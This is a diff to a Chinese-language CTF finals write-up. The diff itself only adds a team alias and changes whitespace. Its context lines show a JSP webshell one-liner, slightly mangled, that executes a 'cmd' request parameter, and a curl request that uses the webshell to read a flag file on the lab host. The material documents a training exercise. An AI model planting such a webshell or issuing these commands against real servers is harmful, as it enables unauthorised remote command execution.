@@ -1,5 +1,8 @@
 # CSC CTF 2023 決賽
 隊伍名稱: 名字好難想RRRRRRRRRRRRRRR
+
+無名
+
 ## 教學題
 ### Q4
 #### 題目敘述
@@ -203,9 +206,9 @@ Webshell + URL Encode
     /usr/local/share/man/flag.txt
     $ curl http://192.168.100.88:8888/shell.jsp\?cmd\=cat%20/usr/local/share/man/flag.txt --output -
     CSC{FLAG_can_we_cut_to_the_chase?}
-
+    
     //
     - java.io.InputStream in = -.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } -
     ```
     記得要注意URL encode
-Flag: `CSC{FLAG_can_we_cut_to_the_chase?}1`
+    Flag: `CSC{FLAG_can_we_cut_to_the_chase?}1`
